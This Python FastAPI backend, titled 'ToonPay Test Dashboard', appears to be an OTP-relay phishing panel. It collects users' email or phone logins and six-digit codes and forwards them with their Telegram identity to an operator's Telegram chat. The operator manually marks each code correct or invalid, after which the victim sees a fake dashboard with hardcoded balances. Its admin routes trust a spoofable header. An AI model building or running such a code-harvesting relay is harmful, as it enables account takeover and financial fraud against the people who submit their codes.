import os,re,httpx
from pathlib import Path
from dotenv import load_dotenv
from fastapi import FastAPI,HTTPException,Header
from fastapi.responses import FileResponse
from pydantic import BaseModel,Field
import database
load_dotenv()
BOT_TOKEN=os.getenv("BOT_TOKEN","")
ADMIN_ID=int(os.getenv("ADMIN_TELEGRAM_ID","0"))
BASE_DIR=Path(__file__).parent
database.init_db()
app=FastAPI(title="ToonPay Test Dashboard")
class LoginRequest(BaseModel):
    telegram_id:int
    username:str|None=None
    login_value:str=Field(min_length=3,max_length=160)
    login_method:str
class CodeSubmit(BaseModel):
    request_id:int
    entered_code:str=Field(min_length=6,max_length=6)
async def tg_message(chat_id,text,markup=None):
    if not BOT_TOKEN:return
    payload={"chat_id":chat_id,"text":text}
    if markup:payload["reply_markup"]=markup
    async with httpx.AsyncClient(timeout=20) as c:
        r=await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",json=payload)
        r.raise_for_status()
@app.get("/")
async def home(): return FileResponse(BASE_DIR/"static"/"index.html")
@app.get("/app.js")
async def js(): return FileResponse(BASE_DIR/"static"/"app.js",media_type="application/javascript")
@app.get("/style.css")
async def css(): return FileResponse(BASE_DIR/"static"/"style.css",media_type="text/css")
@app.post("/api/login/request")
async def request_login(d:LoginRequest):
    if d.login_method not in ("email","phone"): raise HTTPException(400,"Invalid login method.")
    if d.login_method=="email" and not re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+",d.login_value): raise HTTPException(400,"Enter a valid email address.")
    if d.login_method=="phone" and not re.fullmatch(r"\+?[0-9][0-9\s\-()]{6,24}",d.login_value): raise HTTPException(400,"Enter a valid phone number.")
    return {"request_id":database.create_login_request(d.telegram_id,d.username,d.login_value,d.login_method),"status":"waiting_code"}
@app.post("/api/login/submit-code")
async def submit_code(d:CodeSubmit):
    if not d.entered_code.isdigit(): raise HTTPException(400,"Code must contain numbers only.")
    r=database.get_request(d.request_id)
    if not r: raise HTTPException(404,"Login request not found.")
    database.submit_code(d.request_id,d.entered_code)
    msg=(f"🔐 TOONPAY TEST LOGIN\n\nRequest ID: #{d.request_id}\n"
         f"User: @{r['username'] or 'no_username'}\nTelegram ID: {r['telegram_id']}\n"
         f"Method: {r['login_method'].title()}\nLogin: {r['login_value']}\n\n"
         f"🧪 CODE ENTERED BY USER:\n{d.entered_code}\n\nCheck the test code and choose:")
    kb={"inline_keyboard":[[{"text":"✅ Correct OTP","callback_data":f"otp_ok:{d.request_id}"},{"text":"❌ Invalid OTP","callback_data":f"otp_bad:{d.request_id}"}]]}
    if ADMIN_ID: await tg_message(ADMIN_ID,msg,kb)
    return {"status":"pending_admin"}
@app.get("/api/login/status/{rid}")
async def status(rid:int):
    r=database.get_request(rid)
    if not r: raise HTTPException(404,"Request not found.")
    out={"status":r["status"]}
    if r["status"]=="approved": out["session_token"]=r["session_token"]
    return out
@app.post("/internal/admin/approve/{rid}")
async def approve(rid:int,x_admin_id:int|None=Header(default=None)):
    if x_admin_id!=ADMIN_ID: raise HTTPException(403,"Admin only.")
    r=database.get_request(rid)
    if not r: raise HTTPException(404,"Request not found.")
    token=database.create_session(r["telegram_id"],r["username"])
    database.attach_session(rid,token); database.set_status(rid,"approved")
    return {"status":"approved"}
@app.post("/internal/admin/reject/{rid}")
async def reject(rid:int,x_admin_id:int|None=Header(default=None)):
    if x_admin_id!=ADMIN_ID: raise HTTPException(403,"Admin only.")
    if not database.get_request(rid): raise HTTPException(404,"Request not found.")
    database.set_status(rid,"rejected"); return {"status":"rejected"}
@app.get("/api/dashboard")
async def dashboard(authorization:str|None=Header(default=None)):
    if not authorization: raise HTTPException(401,"Missing session.")
    s=database.get_session(authorization.replace("Bearer ","").strip())
    if not s: raise HTTPException(401,"Invalid session.")
    return {
      "user":{"telegram_id":s["telegram_id"],"username":s["username"]},
      "balance":"0.66","currency":"USD","cashback":"0.00",
      "points":0,"points_target":100,"plan":"Starter","plan_expiry":"Feb 12",
      "notifications":1,"referrals":{"count":0,"earned":"0.00"},
      "transactions":[
        {"title":"Test deposit","amount":"+$10.00","status":"Completed"},
        {"title":"Test transfer","amount":"-$2.50","status":"Completed"},
        {"title":"Cashback reward","amount":"+$0.25","status":"Completed"}
      ]
    }
